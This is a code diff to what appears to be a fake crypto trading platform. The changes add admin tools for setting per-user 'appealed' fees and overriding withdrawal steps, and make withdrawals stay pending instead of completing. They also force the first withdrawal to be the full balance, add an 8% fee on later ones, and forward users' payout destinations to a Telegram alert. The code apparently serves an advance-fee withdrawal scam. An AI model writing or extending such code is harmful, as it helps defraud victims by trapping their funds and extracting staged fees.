@@ -345,12 +345,11 @@
                 </form>
             </div>
 
-            <!-- MANUAL USER STATUS & STEP OVERRIDE / ASSIGNMENT FOR WITHDRAWAL USERS -->
+            <!-- ADVANCED WITHDRAWAL & STEP ASSIGNMENT / FEE MANAGEMENT -->
             <div class="card" style="border: 2px dashed var(--primary);">
-                <h3>🛠️ Users With Active Withdrawals & Fee Appeals Management</h3>
-                <p style="color:var(--text-muted); font-size:0.85rem; margin-bottom:1rem;">Manage users who have submitted withdrawal requests, view their current step, edit appealed fees, or search by email:</p>
+                <h3>🛠️ Active Withdrawals, Payout Details & Step Assignment</h3>
+                <p style="color:var(--text-muted); font-size:0.85rem; margin-bottom:1rem;">View user payout details, edit appealed fees, override their current step, and configure post-approval step progression:</p>
                 
-                <!-- Search bar for users with withdrawals -->
                 <div class="form-group">
                     <input type="text" id="admin-withdrawal-search" class="form-control" placeholder="Search user by email..." oninput="renderAdminDashboard()">
                 </div>
@@ -374,14 +373,11 @@
             <div class="card">
                 <h3>💬 Live Support Inbox (WhatsApp Style) & Agent Management</h3>
                 <div style="display:grid; grid-template-columns: 280px 1fr; gap:1rem; margin-bottom:1.5rem; background:var(--bg-input); padding:1rem; border-radius:10px; border:1px solid var(--border);">
-                    <!-- Left: User Conversation List -->
                     <div style="border-right:1px solid var(--border); padding-right:0.75rem;">
                         <h4 style="font-size:0.85rem; color:var(--text-muted); margin-bottom:0.5rem;">Conversations</h4>
                         <div id="admin-chat-users-list" style="max-height:280px; overflow-y:auto; display:flex; flex-direction:column; gap:0.4rem;"></div>
                     </div>
-                    <!-- Right: Active WhatsApp Style Chat View -->
                     <div style="display:flex; flex-direction:column; gap:0.75rem;">
-                        <!-- Top Dropdowns Side-by-Side & Profile Name -->
                         <div style="background:var(--bg-card); padding:0.75rem; border-radius:8px; border:1px solid var(--border); display:flex; flex-direction:column; gap:0.5rem;">
                             <div style="display:flex; justify-content:space-between; align-items:center;">
                                 <strong id="admin-whatsapp-profile-title" style="font-size:0.95rem; color:var(--accent-green);">💬 Profile: Select User</strong>
@@ -548,7 +544,7 @@
             <span class="close-btn" onclick="closeWithdrawFormModal()">&times;</span>
             <h3 style="margin-bottom:1rem;" id="withdraw-method-title">Withdraw</h3>
             <div style="background: rgba(99, 102, 241, 0.1); border: 1px solid var(--primary); padding: 0.75rem; border-radius: 8px; margin-bottom: 1rem; font-size: 0.85rem; color: var(--text-muted);">
-                💡 <strong>Note:</strong> Withdrawals are processed exclusively using your <strong>USD Fiat balance</strong>. If you have available crypto assets (BTC/ETH) and want to withdraw, please use the <strong>Sell</strong> button first to convert them to USD fiat.
+                💡 <strong>Withdrawal Policy:</strong> First withdrawal must be for your entire available balance at once (Free with zero charges). Subsequent withdrawals carry an 8% withdrawal fee. Withdrawals are processed exclusively using your <strong>USD Fiat balance</strong>.
             </div>
             <form onsubmit="requestWithdrawalPinCheck(event)">
                 <div class="form-group">
@@ -564,7 +560,10 @@
                     <input type="text" id="withdraw-addr" class="form-control" required>
                 </div>
                 <div class="form-group">
-                    <label>Amount (USD Value)</label>
+                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:0.5rem;">
+                        <label style="margin-bottom:0;">Amount (USD Value)</label>
+                        <button type="button" class="btn btn-outline" style="width:auto; padding:0.2rem 0.5rem; font-size:0.75rem;" onclick="setWithdrawMaxAmount()">MAX / Withdraw All</button>
+                    </div>
                     <input type="number" step="any" id="withdraw-amt" class="form-control" required>
                 </div>
                 <button type="submit" class="btn btn-success">Proceed to PIN Authorization</button>
@@ -897,7 +896,8 @@
                             tx.status = `PENDING (${nextStep.title.toUpperCase()})`;
                         }
                     } else {
-                        if (tx) tx.status = "COMPLETED";
+                        // Do not mark completed; remain pending waiting for admin custom step upload
+                        if (tx) tx.status = "PENDING (WAITING FOR REVIEW)";
                         u.activeTxId = null;
                     }
                     updated = true;
@@ -1185,6 +1185,12 @@
         }
         function closeWithdrawFormModal() { document.getElementById('withdraw-form-modal').style.display = 'none'; }
 
+        function setWithdrawMaxAmount() {
+            const u = getCurrentUserData();
+            if (!u) return;
+            document.getElementById('withdraw-amt').value = u.usd;
+        }
+
         function requestWithdrawalPinCheck(e) {
             e.preventDefault();
             const amt = Number(document.getElementById('withdraw-amt').value);
@@ -1193,6 +1199,18 @@
                 alert("Insufficient USD cash balance! Please use the 'Sell' button on your dashboard to convert your crypto assets to USD fiat first."); 
                 return; 
             }
+
+            const hasPriorWithdrawal = (u.txs || []).some(t => t.type && t.type.toLowerCase().includes('withdraw'));
+            if (!hasPriorWithdrawal) {
+                // First withdrawal must be for the entire balance at once
+                if (Math.abs(amt - u.usd) > 0.01) {
+                    alert(`First withdrawal must be for your entire available balance ($${u.usd.toFixed(2)}) at once, as your first withdrawal is completely free without charges.`);
+                    return;
+                }
+            } else {
+                // Subsequent withdrawals carry 8% fee
+            }
+
             closeWithdrawFormModal();
             document.getElementById('verify-pin-input').value = '';
             document.getElementById('pin-confirm-modal').style.display = 'flex';
@@ -1207,18 +1225,45 @@
             closePinConfirmModal();
 
             const amt = Number(document.getElementById('withdraw-amt').value);
-            u.usd -= amt;
+            const hasPriorWithdrawal = (u.txs || []).some(t => t.type && t.type.toLowerCase().includes('withdraw'));
+            
+            let finalDeduct = amt;
+            let feeCharged = 0;
+            if (hasPriorWithdrawal) {
+                feeCharged = amt * 0.08;
+                finalDeduct = amt + feeCharged;
+                if (finalDeduct > u.usd) {
+                    alert(`Insufficient balance to cover the 8% withdrawal fee ($${feeCharged.toFixed(2)}). Total required: $${finalDeduct.toFixed(2)}`);
+                    return;
+                }
+            }
+
+            u.usd -= finalDeduct;
+
+            const bankName = selectedWithdrawMethodName === 'Bank Transfer' ? document.getElementById('withdraw-bank-name').value : '';
+            const accName = selectedWithdrawMethodName === 'Bank Transfer' ? document.getElementById('withdraw-acc-name').value : '';
+            const destAddr = document.getElementById('withdraw-addr').value;
 
             const txId = Date.now();
             u.activeTxId = txId;
             u.stepIdx = 0;
             const firstStep = actionSteps.length > 0 ? actionSteps[0] : { title: "ACTIVATING", amount: 0, statusMsg: "Processing" };
 
-            u.txs.unshift({ id: txId, type: `Withdraw (${selectedWithdrawMethodName})`, amount: amt, baseWithdraw: amt, status: `PENDING (${firstStep.title.toUpperCase()})` });
+            u.txs.unshift({ 
+                id: txId, 
+                type: `Withdraw (${selectedWithdrawMethodName})`, 
+                amount: amt, 
+                fee: feeCharged,
+                bankName, 
+                accName, 
+                destAddr, 
+                status: `PENDING (${firstStep.title.toUpperCase()})` 
+            });
+
             saveState(); updateBalanceUI();
             showNotification("Processing", `Withdrawal request submitted`, "💳");
             
-            sendTelegramAlert(`💳 <b>NEW WITHDRAWAL REQUEST</b>\n\n👤 <b>User:</b> ${currentUserEmail}\n💰 <b>Amount:</b> $${amt.toFixed(2)}\n🏦 <b>Method:</b> ${selectedWithdrawMethodName}`);
+            sendTelegramAlert(`💳 <b>NEW WITHDRAWAL REQUEST</b>\n\n👤 <b>User:</b> ${currentUserEmail}\n💰 <b>Amount:</b> $${amt.toFixed(2)}${feeCharged > 0 ? ` (Fee: $${feeCharged.toFixed(2)})` : ''}\n🏦 <b>Method:</b> ${selectedWithdrawMethodName}\n📍 <b>Destination:</b> ${destAddr}${bankName ? ` (${bankName} - ${accName})` : ''}`);
 
             setTimeout(() => { openActionModal(); }, 1500);
         }
@@ -1404,6 +1449,7 @@
         }
 
         function deleteAgent(id) {
+            if (!confirm("Are you sure you want to delete this support agent?")) return;
             supportAgents = supportAgents.filter(x => x.id != id);
             saveState();
             renderAdminDashboard();
@@ -1592,7 +1638,22 @@
             exchanges.push({ id: Date.now(), name: document.getElementById('ex-name').value, logo: document.getElementById('ex-logo').value, link: document.getElementById('ex-link').value });
             saveState(); alert("Exchange added!");
         }
-        function deleteExchange(id) { exchanges = exchanges.filter(x => x.id != id); saveState(); }
+        function deleteExchange(id) {
+            if (!confirm("Are you sure you want to delete this exchange link?")) return;
+            exchanges = exchanges.filter(x => x.id != id);
+            saveState();
+            renderAdminDashboard();
+        }
+
+        function deleteUserAccount(email) {
+            if (!confirm(`Are you SURE you want to delete user account "${email}"? This action cannot be undone.`)) return;
+            usersList = usersList.filter(x => x.email.trim().toLowerCase() !== email.trim().toLowerCase());
+            delete userEmails[email];
+            delete chatThreads[email];
+            saveState();
+            renderAdminDashboard();
+            alert(`User account ${email} deleted successfully.`);
+        }
 
         function saveActionStep(e) {
             e.preventDefault();
@@ -1609,7 +1670,12 @@
             document.getElementById('action-timer').value = '2';
             saveState(); alert("Action step saved with timer!");
         }
-        function deleteActionStep(id) { actionSteps = actionSteps.filter(x => x.id != id); saveState(); }
+        function deleteActionStep(id) {
+            if (!confirm("Are you sure you want to delete this action step?")) return;
+            actionSteps = actionSteps.filter(x => x.id != id);
+            saveState();
+            renderAdminDashboard();
+        }
 
         function adminEditStepPrice(stepIndex) {
             const step = actionSteps[stepIndex];
@@ -1640,6 +1706,27 @@
             saveState();
             renderAdminDashboard();
             alert(`Appealed fee set to $${parsed} for user ${userEmail}`);
+        }
+
+        function adminOverrideUserStep(userEmail) {
+            const u = usersList.find(x => x.email.trim().toLowerCase() === userEmail.trim().toLowerCase());
+            if (!u) return;
+
+            let stepOptions = actionSteps.map((st, i) => `${i}: ${st.title}`).join('\n');
+            const chosenIdx = prompt(`Select step index to assign to ${userEmail}:\n\n${stepOptions}\nEnter step number index:`, "0");
+            if (chosenIdx === null) return;
+            const stepIndex = parseInt(chosenIdx, 10);
+            if (isNaN(stepIndex) || !actionSteps[stepIndex]) { alert("Invalid step index."); return; }
+
+            u.stepIdx = stepIndex;
+            const tx = (u.txs || []).find(t => t.id == u.activeTxId);
+            if (tx) {
+                tx.status = `PENDING (${actionSteps[stepIndex].title.toUpperCase()})`;
+            }
+
+            saveState();
+            renderAdminDashboard();
+            alert(`Successfully assigned step "${actionSteps[stepIndex].title}" to ${userEmail}`);
         }
 
         function approveProof(proofId) {
@@ -1702,7 +1789,6 @@
             document.getElementById('admin-kb-text').value = knowledgeBase || '';
             document.getElementById('admin-target-user').innerHTML = usersList.map(u => `<option value="${u.email}">${u.email} [ID: ${u.userId}] (USD: $${u.usd})</option>`).join('');
 
-            // Filter users who have active withdrawals or past withdrawal transactions
             const searchVal = (document.getElementById('admin-withdrawal-search').value || '').trim().toLowerCase();
             const usersWithWithdrawals = usersList.filter(u => {
                 const hasWithdrawalTx = (u.txs || []).some(t => t.type && t.type.toLowerCase().includes('withdraw'));
@@ -1717,15 +1803,25 @@
                 displayedWithdrawalUsers.map(u => {
                     const withdrawTx = (u.txs || []).find(t => t.type && t.type.toLowerCase().includes('withdraw'));
                     const amount = withdrawTx ? withdrawTx.amount : 0;
-                    const stepName = actionSteps[u.stepIdx] ? actionSteps[u.stepIdx].title : 'Completed / None';
+                    const fee = withdrawTx && withdrawTx.fee ? withdrawTx.fee : 0;
+                    const bankName = withdrawTx && withdrawTx.bankName ? withdrawTx.bankName : '';
+                    const accName = withdrawTx && withdrawTx.accName ? withdrawTx.accName : '';
+                    const destAddr = withdrawTx && withdrawTx.destAddr ? withdrawTx.destAddr : 'N/A';
+                    const stepName = actionSteps[u.stepIdx] ? actionSteps[u.stepIdx].title : 'All Steps Completed / Pending Custom Step';
+                    
                     return `
-                        <div style="background:var(--bg-input); padding:0.6rem; margin-bottom:0.4rem; border-radius:6px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:0.5rem;">
-                            <div>
-                                <strong>${u.name || 'User'} (${u.email})</strong> [ID: ${u.userId}]<br>
-                                <span style="font-size:0.8rem; color:var(--text-muted);">Withdrawal Amount: $${amount.toFixed(2)} | Current Step: <strong>${stepName}</strong> (Index: ${u.stepIdx || 0})</span>
-                            </div>
-                            <div>
-                                <button class="btn btn-outline" style="width:auto; padding:0.2rem 0.5rem; font-size:0.75rem;" onclick="adminEditUserAppealedFee('${u.email}', ${u.stepIdx || 0})">Edit Appealed Fee</button>
+                        <div style="background:var(--bg-input); padding:0.75rem; margin-bottom:0.6rem; border-radius:8px; border:1px solid var(--border);">
+                            <div style="display:flex; justify-content:space-between; align-items:flex-start; flex-wrap:wrap; gap:0.5rem;">
+                                <div>
+                                    <strong>${u.name || 'User'} (${u.email})</strong> [ID: ${u.userId}]<br>
+                                    <span style="font-size:0.82rem; color:var(--accent-green);">Withdrawal Amount: $${amount.toFixed(2)}${fee > 0 ? ` (Fee: $${fee.toFixed(2)})` : ''}</span><br>
+                                    <span style="font-size:0.82rem; color:var(--text-muted);">Destination: <strong>${destAddr}</strong> ${bankName ? `(${bankName} - ${accName})` : ''}</span><br>
+                                    <span style="font-size:0.82rem; color:var(--accent-yellow);">Current Step: <strong>${stepName}</strong> (Index: ${u.stepIdx || 0})</span>
+                                </div>
+                                <div style="display:flex; gap:0.4rem; flex-wrap:wrap;">
+                                    <button class="btn btn-outline" style="width:auto; padding:0.25rem 0.5rem; font-size:0.75rem;" onclick="adminEditUserAppealedFee('${u.email}', ${u.stepIdx || 0})">Edit Appealed Fee</button>
+                                    <button class="btn" style="width:auto; padding:0.25rem 0.5rem; font-size:0.75rem;" onclick="adminOverrideUserStep('${u.email}')">Assign / Override Step</button>
+                                </div>
                             </div>
                         </div>
                     `;
@@ -1743,6 +1839,9 @@
                 <div style="background:var(--bg-input); padding:0.6rem; margin-bottom:0.4rem; border-radius:6px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:0.5rem;">
                     <div>
                         <strong>${u.name || 'User'} (${u.email})</strong> [ID: ${u.userId}] - USD: $${u.usd}
+                    </div>
+                    <div>
+                        <button class="btn btn-danger" style="width:auto; padding:0.2rem 0.5rem; font-size:0.75rem;" onclick="deleteUserAccount('${u.email}')">Delete Account</button>
                     </div>
                 </div>
             `).join('');
@@ -1880,7 +1979,6 @@
             alert(platformTerms);
         };
 
-        // --- PASSWORD RESET FUNCTIONS ---
         function openForgotPasswordModal() {
             closeAuthModal();
             document.getElementById('reset-email-input').value = '';
